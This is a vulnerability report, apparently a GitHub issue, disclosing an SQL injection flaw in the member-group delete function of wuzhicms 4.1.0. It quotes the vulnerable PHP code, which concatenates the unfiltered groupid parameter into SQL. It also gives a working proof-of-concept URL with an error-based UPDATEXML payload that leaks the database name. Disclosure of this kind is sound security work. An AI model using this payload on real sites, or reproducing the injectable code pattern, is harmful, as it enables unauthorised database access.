## This is wuzhicms4.1.0
https://github.com/wuzhicms/wuzhicms
##  Vulnerability file:
### /coreframe/app/member/admin/group.php：132-160
 public function del() {
	if(isset($GLOBALS['groupid']) && $GLOBALS['groupid']) {
		if(is_array($GLOBALS['groupid'])) {
			$where = ' IN ('.implode(',', $GLOBALS['groupid']).')';
			foreach($GLOBALS['groupid'] as $gid) {
				$this->db->delete('member_group_priv', array('groupid' => $gid));
			}
		} else {
			$where = ' = '.$GLOBALS['groupid'];
			$this->db->delete('member_group_priv', array('groupid' => $GLOBALS['groupid']));
		}
		$this->db->delete('member_group', 'issystem != 1 AND groupid'.$where);
		$this->group->set_cache();
		if(isset($GLOBALS['callback'])){
			echo $GLOBALS['callback'].'({"status":1})';
		}else{
			MSG(L('operation_success'));
		}
	}else{
		if(isset($GLOBALS['callback'])){
			echo $GLOBALS['callback'].'({"status":0})';
		}else{
			MSG(L('operation_failure'));
		}
	}
}
In the group.php file, the $groupid parameter under the del method are controllable, and the $groupid parameter is not strictly filtered, causing SQL injection vulnerabilities!
## poc
index.php?m=member&f=group&v=del&groupid=7 and UPDATEXML(1,CONCAT(0x7e,database()),3)&_su=wuzhicms&_menuid=86

The vulnerability is located in the management member -> member group management list -> delete operation
<img width="1718" alt="image" src="https://user-images.githubusercontent.com/124221747/216211446-cc0b820b-ea2c-4a99-abb3-02818240f64d.png">
<img width="1714" alt="image" src="https://user-images.githubusercontent.com/124221747/216211512-b31059c3-7151-468e-a61c-8cfe9aa52300.png">
<img width="1130" alt="image" src="https://user-images.githubusercontent.com/124221747/216211560-15ef1d49-2f51-471c-b2dc-034d10dbb22e.png">


}
